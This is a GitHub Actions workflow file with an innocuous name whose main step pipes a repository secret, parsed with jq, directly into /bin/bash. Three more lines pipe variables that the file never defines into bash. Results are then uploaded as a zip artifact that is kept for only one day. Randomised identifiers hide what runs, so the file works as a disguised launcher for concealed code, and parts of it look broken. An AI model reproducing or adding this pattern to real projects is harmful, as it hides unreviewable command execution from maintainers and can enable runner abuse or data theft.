name: Pipeline
on:
  workflow_dispatch:

permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          dxrqf5360: ${{ secrets.dxrqf5360 }}
        run: |
          printf '%s' "$dxrqf5360" | jq -r .c7 | /bin/bash
          echo $z12 | jq -r .smjtw86739 | /bin/bash
          printf '%s' "$m35" | jq -r .limdn5908 | /bin/bash
          echo $tfwht58 | jq -r .v92864 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: P1TNg98a
          path: "*.zip"
          retention-days: 1
